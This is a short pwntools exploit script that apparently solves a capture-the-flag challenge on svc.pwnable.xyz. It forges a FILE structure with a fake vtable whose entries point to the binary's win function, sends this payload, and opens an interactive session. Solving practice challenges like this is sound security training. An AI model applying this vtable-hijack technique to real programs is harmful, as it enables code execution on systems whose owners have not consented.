from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30018)
input_val = 0x0000000000601260
win = e.symbols['win']

payload = p64(0) * 17
payload += p64(input_val) # _IO_lock_t -> NULL bytes
payload += p64(0) * 9
payload += p64(input_val + 224) # vtable
payload += p64(win) * 20
p.sendafter('>',payload)

p.interactive()